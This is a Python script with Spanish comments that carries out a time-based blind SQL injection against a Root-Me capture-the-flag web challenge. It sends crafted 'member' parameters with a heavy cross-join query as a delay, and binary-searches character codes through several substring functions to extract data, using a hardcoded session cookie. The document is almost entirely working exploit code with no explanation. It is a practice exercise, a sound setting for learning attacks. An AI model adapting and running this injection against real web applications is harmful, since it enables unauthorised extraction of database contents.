#!/usr/bin/env python3
"""
SQL INJECTION TIME-BASED - ROOT-ME CH40
VERSIÓN 49 - PROBAR DIFERENTES FUNCIONES
"""
import requests
import time
import statistics

URL = "http://challenge01.root-me.org/web-serveur/ch40/"
COOKIE = {"PHPSESSID": "fbf0fdc633505f66eef3f20808f0d1ce"}

class TimeBasedInjector:
    def __init__(self):
        self.session = requests.Session()
        self.session.cookies.update(COOKIE)
        self.heavy = "(SELECT COUNT(*) FROM usuarios, usuarios T1, usuarios T2)"
        self.technique = "1 AND ({cond}) AND {heavy}"
        self.threshold = 41.23
        self.mode = "normal"
        
    def test_payload(self, payload, repeats=5):
        tiempos = []
        params = {"action": "member", "member": payload}
        for _ in range(repeats):
            inicio = time.perf_counter_ns()
            try:
                r = self.session.get(URL, params=params, timeout=5)
                tiempo = (time.perf_counter_ns() - inicio) / 1_000_000
                tiempos.append(tiempo)
            except:
                tiempos.append(0)
            time.sleep(0.1)
        return statistics.median(tiempos) if tiempos else 0
    
    def is_true(self, condition):
        payload = f"1 AND ({condition}) AND {self.heavy}"
        t = self.test_payload(payload, repeats=3)
        return t > self.threshold
    
    def extract_char_with_function(self, query, pos, func):
        """Extrae un carácter usando una función específica"""
        low, high = 32, 126
        while low <= high:
            mid = (low + high) // 2
            cond = f"ASCII({func}(({query}), {pos}, 1)) > {mid}"
            if self.is_true(cond):
                low = mid + 1
            else:
                high = mid - 1
        return chr(low)
    
    def extract_string(self, query, label="Extrayendo", func="SUBSTRING", max_len=50):
        print(f"\n[*] {label} (usando {func})...")
        result = ""
        for pos in range(1, max_len + 1):
            char = self.extract_char_with_function(query, pos, func)
            result += char
            print(f"    [{pos}] '{char}' (ASCII: {ord(char)})")
            if ord(char) == 0 or ord(char) == 32:
                break
            time.sleep(0.1)
        return result

# ============================================================
# EJECUCIÓN
# ============================================================
injector = TimeBasedInjector()

print("="*70)
print("  PROBANDO DIFERENTES FUNCIONES")
print("="*70)

query = "SELECT 'admin'"

# Probar diferentes funciones
funciones = ["SUBSTRING", "MID", "SUBSTR", "LEFT"]

for func in funciones:
    print(f"\n[1] Probando {func}...")
    resultado = injector.extract_string(query, f"SELECT 'admin'", func)
    print(f"\n  Resultado: '{resultado}'")
    
    if resultado == "admin":
        print(f"  ✅ ¡{func} funciona correctamente!")
        break
    else:
        print(f"  ❌ {func} no funciona")
